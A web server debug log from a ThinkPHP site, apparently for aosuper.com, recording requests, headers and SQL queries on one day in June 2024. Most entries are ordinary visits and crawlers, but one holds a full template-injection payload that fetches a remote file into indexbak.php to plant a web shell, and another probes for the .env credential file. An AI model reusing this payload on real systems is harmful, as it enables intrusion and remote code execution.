+[ sql ] [ DB ] CONNECT:[ UseTime:0.000685s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `product` [ RunTime:0.001204s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC [ RunTime:0.008333s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC LIMIT 0,15 [ RunTime:0.000951s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:30:07+08:00 ] 78.153.140.218 GET aosuper.com/.env
+[运行时间：0.094862s] [吞吐率：10.54req/s] [内存消耗：1,334.70kb] [文件加载：36]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.env',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2024-06-13T01:29:50+08:00 ] 5.196.160.191 GET aosuper.com/
+[运行时间：0.079403s] [吞吐率：12.59req/s] [内存消耗：2,950.91kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'sec-ch-ua-platform' => '"Linux"',
+  'sec-gpc' => '1',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Not A(Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"',
+  'connection' => 'keep-alive',
+  'origin' => 'http://aosuper.com',
+  'referer' => 'http://aosuper.com',
+  'dnt' => '1',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000742s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001182s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '5.196.160.191' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.032210s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '5.196.160.191' [ RunTime:0.006557s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('5.196.160.191' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 01:29:50' , 1 , '普通网友') [ RunTime:0.000513s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '5.196.160.191'  AND `ucookie` IS NULL [ RunTime:0.006077s ]
+---------------------------------------------------------------
+[ 2024-06-13T05:44:56+08:00 ] 43.155.136.16 GET www.aosuper.com/
+[运行时间：0.209890s] [吞吐率：4.76req/s] [内存消耗：2,949.92kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'referer' => 'http://www.aosuper.com',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'cache-control' => 'no-cache',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+  'host' => 'www.aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000692s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.030267s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.155.136.16' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000638s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000432s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.155.136.16' [ RunTime:0.006504s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('43.155.136.16' , 2 , '2024-06' , '访客-浏览网页' , '2024-06-13 05:44:56' , 3 , '普通网友') [ RunTime:0.000432s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '43.155.136.16'  AND `ucookie` IS NULL [ RunTime:0.006237s ]
+---------------------------------------------------------------
+[ 2024-06-13T07:24:58+08:00 ] 66.249.66.203 GET aosuper.com/
+[运行时间：0.046428s] [吞吐率：21.54req/s] [内存消耗：2,948.05kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate, br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.174 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..8"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000730s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001272s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.203' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000645s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000277s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.203' [ RunTime:0.007425s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('66.249.66.203' , 3 , '2024-06' , '访客-浏览网页' , '2024-06-13 07:24:58' , 3 , '普通网友') [ RunTime:0.000457s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.203'  AND `ucookie` IS NULL [ RunTime:0.006139s ]
+---------------------------------------------------------------
+[ 2024-06-13T08:40:42+08:00 ] 103.114.163.20 GET aosuper.com/?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=file_put_contents&t1=indexbak.php&t2=file_get_contents&t3=http://81.17.22.42:8001/xx.txt
+[运行时间：0.079235s] [吞吐率：12.62req/s] [内存消耗：2,946.54kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'tag' => '{pbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))}ok{/pbohome/Indexot:if}',
+  'tagstpl' => 'news.html',
+  't' => 'file_put_contents',
+  't1' => 'indexbak.php',
+  't2' => 'file_get_contents',
+  't3' => 'http://81.17.22.42:8001/xx.txt',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000767s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001362s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '103.114.163.20' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.033165s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000559s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '103.114.163.20' [ RunTime:0.006621s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('103.114.163.20' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 08:40:42' , 1 , '普通网友') [ RunTime:0.000514s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '103.114.163.20'  AND `ucookie` IS NULL [ RunTime:0.006090s ]
+---------------------------------------------------------------
+[ 2024-06-13T09:24:27+08:00 ] 65.108.0.71 GET aosuper.com/index
+[运行时间：0.319992s] [吞吐率：3.13req/s] [内存消耗：2,950.34kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'aosuper.com',
+  'connection' => 'close',
+  'accept-language' => 'en',
+  'accept-encoding' => 'br,gzip',
+  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
+  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000770s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002173s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '65.108.0.71' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.101524s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000583s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '65.108.0.71' [ RunTime:0.006363s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('65.108.0.71' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 09:24:27' , 1 , '普通网友') [ RunTime:0.000650s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '65.108.0.71'  AND `ucookie` IS NULL [ RunTime:0.006086s ]
+---------------------------------------------------------------
+[ 2024-06-13T10:08:51+08:00 ] 52.167.144.170 GET aosuper.com/
+[运行时间：0.341795s] [吞吐率：2.93req/s] [内存消耗：2,944.99kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36',
+  'from' => 'bingbot(at)microsoft.com',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000908s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001264s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '52.167.144.170' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.133547s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000557s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '52.167.144.170' [ RunTime:0.006540s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('52.167.144.170' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 10:08:51' , 1 , '普通网友') [ RunTime:0.000536s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '52.167.144.170'  AND `ucookie` IS NULL [ RunTime:0.006545s ]
+---------------------------------------------------------------
+[ 2024-06-13T11:30:36+08:00 ] 177.55.224.48 GET aosuper.com/
+[运行时间：0.148222s] [吞吐率：6.75req/s] [内存消耗：2,948.04kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'sec-fetch-dest' => 'document',
+  'accept-language' => 'pt-BR,pt;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
+  'sec-fetch-mode' => 'navigate',
+  'upgrade-insecure-requests' => '1',
+  'accept-encoding' => 'gzip, deflate',
+  'sec-fetch-site' => 'none',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000829s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.014428s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '177.55.224.48' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.087842s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000781s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '177.55.224.48' [ RunTime:0.007069s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('177.55.224.48' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 11:30:36' , 1 , '普通网友') [ RunTime:0.000566s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '177.55.224.48'  AND `ucookie` IS NULL [ RunTime:0.006490s ]
+---------------------------------------------------------------
+[ 2024-06-13T11:30:41+08:00 ] 177.55.224.48 GET aosuper.com/login.php/index/captcha
+[运行时间：0.151812s] [吞吐率：6.59req/s] [内存消耗：10,915.38kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'captcha',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate, br',
+  'referer' => 'https://aosuper.com/',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
+  'sec-fetch-mode' => 'no-cors',
+  'accept-language' => 'pt-BR,pt;q=0.9',
+  'sec-fetch-dest' => 'image',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->captcha[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000566s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001166s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.019004s ]
+---------------------------------------------------------------
+[ 2024-06-13T16:26:45+08:00 ] 64.23.142.6 GET aosuper.com/
+[运行时间：2.050834s] [吞吐率：0.49req/s] [内存消耗：2,947.73kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'accept-language' => 'en-US,en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000654s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.075856s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '64.23.142.6' ORDER BY `Id` DESC LIMIT 1 [ RunTime:1.261747s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000577s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '64.23.142.6' [ RunTime:0.006952s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('64.23.142.6' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 16:26:43' , 1 , '普通网友') [ RunTime:0.000541s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '64.23.142.6'  AND `ucookie` IS NULL [ RunTime:0.007598s ]
+---------------------------------------------------------------
+[ 2024-06-13T21:40:25+08:00 ] 172.85.102.143 GET aosuper.com/
+[运行时间：0.554477s] [吞吐率：1.80req/s] [内存消耗：2,948.20kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate, br',
+  'sec-fetch-dest' => 'document',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'none',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
+  0 => 'iflogin',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000748s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.025175s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '172.85.102.143' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.045119s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000662s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '172.85.102.143' [ RunTime:0.006934s ]
+[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('172.85.102.143' , 1 , '2024-06' , '访客-浏览网页' , '2024-06-13 21:40:24' , 1 , '普通网友') [ RunTime:0.000523s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '172.85.102.143'  AND `ucookie` IS NULL [ RunTime:0.006309s ]
+---------------------------------------------------------------
+[ 2024-06-13T21:40:26+08:00 ] 172.85.102.143 GET aosuper.com/login.php/index/captcha
+[运行时间：0.184030s] [吞吐率：5.43req/s] [内存消耗：10,915.09kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'captcha',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate, br',
+  'referer' => 'https://aosuper.com/',
+  'sec-fetch-dest' => 'image',
+  'sec-fetch-mode' => 'no-cors',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->captcha[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000675s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001123s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.018811s ]
